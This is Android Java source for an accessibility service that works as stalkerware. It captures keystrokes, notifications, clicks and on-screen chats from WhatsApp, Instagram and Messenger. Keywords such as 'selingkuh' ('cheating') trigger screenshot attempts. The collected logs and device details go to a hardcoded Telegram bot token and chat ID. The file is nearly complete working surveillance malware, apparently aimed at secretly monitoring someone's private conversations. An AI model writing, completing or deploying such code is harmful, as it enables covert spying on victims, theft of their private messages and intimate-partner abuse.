package com;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.Context;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Handler;
import android.os.HandlerThread;
import android.util.DisplayMetrics;
import android.view.Display;
import android.view.WindowManager;

import org.json.JSONException;
import org.json.JSONObject;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.ByteBuffer;
import java.nio.charset.StandardCharsets;
import java.util.List;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.Arrays;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Base64;

public class MyAccessibilityService extends AccessibilityService {

    private static final int MAX_BUFFER_SIZE = 25;
    private static final String TAG = "AppUsageAccessibilityService";
    private static final String TARGET_APP_PACKAGE1 = "com.whatsapp.w4b";
    private static final String TARGET_APP_PACKAGE2 = "com.whatsapp";
    private static final String TARGET_APP_PACKAGE3 = "com.instagram.android";
    private static final String TARGET_APP_PACKAGE4 = "com.facebook.orca";
    private static final long EXPIRATION_TIME = 10 * 60 * 1000; // 10 minutes in milliseconds

    // Screenshot trigger keywords
    private static final String[] TRIGGER_KEYWORDS = {"test", "selingkuh", "bayar"};

    // Screenshot related variables
    private MediaProjectionManager mediaProjectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private int screenWidth, screenHeight, screenDensity;
    private Handler backgroundHandler;
    private HandlerThread backgroundThread;

    private final StringBuilder currentKeyEvents = new StringBuilder();
    private int keyEventCount = 0;
    private final Map<String, Long> sentTexts = new LinkedHashMap<>();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                handleTextChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                handleNotificationChangedEvent(event);
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                handleTypeViewEvent(event);
                break;
            default:
                // Handle other event types if needed
        }

        if (event == null) return;

        // Check for window state changes
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

            if (TARGET_APP_PACKAGE1.equals(packageName) || TARGET_APP_PACKAGE2.equals(packageName) ||
                    TARGET_APP_PACKAGE3.equals(packageName) || TARGET_APP_PACKAGE4.equals(packageName)) {
                Log.d(TAG, "Target app opened!");
                logAllTexts();
            }
        }
    }

    private String formatScreenText(String rawText) {
        String[] lines = rawText.split("\\r?\\n");
        StringBuilder formatted = new StringBuilder();

        boolean startFormatting = false;
        String lastHeader = "";

        for (String line : lines) {
            line = line.trim();

            // Mulai formatting setelah menemukan baris ini
            if (!startFormatting) {
                if (line.equalsIgnoreCase("Ask Meta AI or Search") ||
                        line.equalsIgnoreCase("Tanya Meta AI atau Cari") ||
                        line.toLowerCase().contains("meta ai")) {
                    startFormatting = true;
                }
                continue;
            }

            if (line.isEmpty()) continue;

            // Jika line mengandung jam, anggap sebagai header pesan/chat
            if (line.matches(".*\\b\\d{1,2}[:\\.]\\d{2}\\b.*")) {
                formatted.append("\n📨 ").append(line).append("\n");
                lastHeader = line;
            } else {
                formatted.append("    └ ").append(line).append("\n");
            }
        }

        return formatted.toString().trim();
    }


    private void sendErrorToTelegram(String errorMessage) {
        new MessageSender().execute("❌ ERROR:\n" + errorMessage);
    }


    private void logAllTexts() {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode != null) {
            StringBuilder stringBuilder = new StringBuilder();
            traverseNode(rootNode, stringBuilder);
            String allTexts = stringBuilder.toString();
            String formattedText = formatScreenText(allTexts);
            Log.d(TAG, "Formatted Screen Content:\n" + formattedText);


            long currentTime = System.currentTimeMillis();
            // Remove expired entries
            sentTexts.entrySet().removeIf(entry -> currentTime - entry.getValue() > EXPIRATION_TIME);

            // Check for trigger keywords and take screenshot if found
            if (containsTriggerKeywords(allTexts)) {
                Log.d(TAG, "Trigger keyword detected! Taking screenshot...");
                takeScreenshot(allTexts);
            }

            // Append the texts to the buffer if they haven't been sent before
            if (!sentTexts.containsKey(allTexts)) {

                currentKeyEvents.append("📱 Screen Content:\n").append(formattedText).append("\n");

                sentTexts.put(allTexts, currentTime);

                // Check buffer size and send if it exceeds MAX_BUFFER_SIZE
                if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                    sendBufferToTelegramAndClear(false);
                }
            } else {
                Log.d(TAG, "Previous text detected. Buffer was not sent.");
                currentKeyEvents.append("⚠️ Duplicate content avoided.\n");
                sendBufferToTelegramAndClear(false);
            }
        }
    }

    private boolean containsTriggerKeywords(String text) {
        String lowerText = text.toLowerCase();
        for (String keyword : TRIGGER_KEYWORDS) {
            if (lowerText.contains(keyword.toLowerCase())) {
                return true;
            }
        }
        return false;
    }

    private void initScreenshot() {
        mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);

        // Get screen dimensions
        WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        Display display = windowManager.getDefaultDisplay();
        DisplayMetrics metrics = new DisplayMetrics();
        display.getRealMetrics(metrics);

        screenWidth = metrics.widthPixels;
        screenHeight = metrics.heightPixels;
        screenDensity = metrics.densityDpi;

        // Setup background thread
        backgroundThread = new HandlerThread("ScreenshotThread");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private void takeScreenshot(String contextText) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            Log.e(TAG, "Screenshot requires API level 21 or higher");
            return;
        }

        // Note: In a real implementation, you would need to request media projection permission
        // from the user first. This is a simplified version for educational purposes.

        try {
            // Setup ImageReader
            imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);

            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                @Override
                public void onImageAvailable(ImageReader reader) {
                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();

                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * screenWidth;

                            Bitmap bitmap = Bitmap.createBitmap(screenWidth + rowPadding / pixelStride, screenHeight, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);

                            // Convert bitmap to base64 for sending
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                            byte[] imageBytes = baos.toByteArray();

                            // Send screenshot with context

                            bitmap.recycle();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error capturing screenshot: " + e.getMessage());
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                    }
                }
            }, backgroundHandler);

        } catch (Exception e) {
            Log.e(TAG, "Failed to setup screenshot: " + e.getMessage());
        }
    }



    private void traverseNode(AccessibilityNodeInfo node, StringBuilder stringBuilder) {
        if (node == null) return;

        if (node.getText() != null) {
            stringBuilder.append(node.getText().toString()).append("\n");
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            traverseNode(node.getChild(i), stringBuilder);
        }
    }

    private void handleTextChangedEvent(AccessibilityEvent event) {
        List<CharSequence> textList = event.getText();
        StringBuilder buffer = new StringBuilder();
        boolean newTextAdded = false;

        for (CharSequence text : textList) {
            String newText = text.toString();
            int newKeyEventCount = countKeyEvents(newText);

            if (newKeyEventCount > keyEventCount) {
                buffer.append(newText.substring(keyEventCount));
                newTextAdded = true;
            }

            keyEventCount = newKeyEventCount;
        }

        if (newTextAdded) {
            String bufferText = buffer.toString();
            currentKeyEvents.append("⌨️ Text Input: ").append(bufferText).append("\n");

            // Check for trigger keywords in text input
            if (containsTriggerKeywords(bufferText)) {
                Log.d(TAG, "Trigger keyword in text input! Taking screenshot...");
                takeScreenshot(bufferText);
            }

            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToTelegramAndClear(false);
            }
        }
    }

    private void handleNotificationChangedEvent(AccessibilityEvent event) {
        StringBuilder notificationTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            notificationTextBuilder.append(text);
        }
        CharSequence notificationText = notificationTextBuilder.toString();

        if (!notificationText.toString().isEmpty()) {
            Notification notification = (Notification) event.getParcelableData();
            StringBuilder notificationDetails = new StringBuilder();
            notificationDetails.append("🔔 Notification:\n");

            if (notification != null) {
                Bundle extras = notification.extras;
                String title = extras.getString(Notification.EXTRA_TITLE, "");
                String text = extras.getString(Notification.EXTRA_TEXT, "");
                String subText = extras.getString(Notification.EXTRA_SUB_TEXT, "");
                String bigText = extras.getString(Notification.EXTRA_BIG_TEXT, "");

                if (!title.isEmpty()) notificationDetails.append("  Title: ").append(title).append("\n");
                if (!text.isEmpty()) notificationDetails.append("  Text: ").append(text).append("\n");
                if (!subText.isEmpty()) notificationDetails.append("  Sub: ").append(subText).append("\n");
                if (!bigText.isEmpty()) notificationDetails.append("  Big: ").append(bigText).append("\n");

                // Check for trigger keywords in notification
                String fullNotificationText = title + " " + text + " " + subText + " " + bigText;
                if (containsTriggerKeywords(fullNotificationText)) {
                    Log.d(TAG, "Trigger keyword in notification! Taking screenshot...");
                    takeScreenshot(fullNotificationText);
                }
            } else {
                notificationDetails.append("  Content: ").append(notificationText).append("\n");

                if (containsTriggerKeywords(notificationText.toString())) {
                    Log.d(TAG, "Trigger keyword in notification! Taking screenshot...");
                    takeScreenshot(notificationText.toString());
                }
            }

            currentKeyEvents.append(notificationDetails);

            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToTelegramAndClear(false);
            }
        }
    }

    private void handleTypeViewEvent(AccessibilityEvent event) {
        StringBuilder clickedViewTextBuilder = new StringBuilder();
        for (CharSequence text : event.getText()) {
            clickedViewTextBuilder.append(text);
        }
        CharSequence clickedViewText = clickedViewTextBuilder.toString();

        if (!clickedViewText.toString().isEmpty()) {
            currentKeyEvents.append("👆 Clicked: ").append(clickedViewText).append("\n");

            if (currentKeyEvents.length() >= MAX_BUFFER_SIZE) {
                sendBufferToTelegramAndClear(false);
            }
        }
    }

    private int countKeyEvents(String text) {
        return text.length();
    }

    private void sendBufferToTelegramAndClear(boolean isScreenshot) {
        String log = currentKeyEvents.toString();

        if (!isScreenshot) {
            // Add device info and timestamp for regular messages
            String deviceInfo = "📱 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n";
            String timestamp = "🕐 Time: " + getCurrentTimestamp() + "\n";
            String separator = "═══════════════════════════\n";

            log = separator + deviceInfo + timestamp + separator + log;
        }

        new MessageSender().execute(log);
        currentKeyEvents.setLength(0); // Clear the builder
    }

    private String getCurrentTimestamp() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
        return sdf.format(new Date());
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);

        // Initialize screenshot functionality
        initScreenshot();

        // Check if it's the first run
        SharedPreferences prefs = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean isFirstRun = prefs.getBoolean("FirstRun", true);

        if (isFirstRun) {
            String deviceDetails = getSYSInfo();
            currentKeyEvents.append("🚀 Service Started\n").append(deviceDetails).append("\n");
            currentKeyEvents.append("🔍 Monitoring keywords: ").append(Arrays.toString(TRIGGER_KEYWORDS)).append("\n");
            sendBufferToTelegramAndClear(false);

            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("FirstRun", false);
            editor.apply();
        }
    }

    private String getSYSInfo() {
        return "📋 System Information:\n" +
                "  Manufacturer: " + Build.MANUFACTURER + "\n" +
                "  Model: " + Build.MODEL + "\n" +
                "  Product: " + Build.PRODUCT + "\n" +
                "  Android: " + Build.VERSION.RELEASE + "\n" +
                "  SDK: " + Build.VERSION.SDK_INT + "\n" +
                "  Board: " + Build.BOARD + "\n";
    }

    @Override
    public void onInterrupt() {
        if (virtualDisplay != null) {
            virtualDisplay.release();
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
        }
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
        }
    }

    private static class MessageSender extends AsyncTask<String, Void, Void> {
        private static final String TAG = "MessageSender";

        @Override
        protected Void doInBackground(String... strings) {
            String log = strings[0];

            try {
                String botNumber = "8044862489";
                String secretKey = "AAG6N9nSl-mS5_qNoDB7AAwHp64VgRS_q_A";
                String botToken = botNumber + ":" + secretKey;
                String chatId = "584847845";
                String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";

                URL url = new URL(urlString);
                HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setDoOutput(true);

                JSONObject messageJSON = new JSONObject();
                messageJSON.put("chat_id", chatId);
                messageJSON.put("text", "```\n" + log + "\n```");
                messageJSON.put("parse_mode", "MarkdownV2");

                OutputStream os = connection.getOutputStream();
                os.write(messageJSON.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
                os.close();

                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    Log.d(TAG, "Message sent to Telegram chat.");
                } else {
                    Log.e(TAG, "Failed to send message to Telegram chat. Response code: " + responseCode);
                }
                connection.disconnect();
            } catch (JSONException e) {
                Log.e(TAG, "Failed to create JSON object: " + e.getMessage());
            } catch (Exception e) {
                Log.e(TAG, "Failed to send message to Telegram chat: " + e.getMessage());
            }
            return null;
        }
    }


}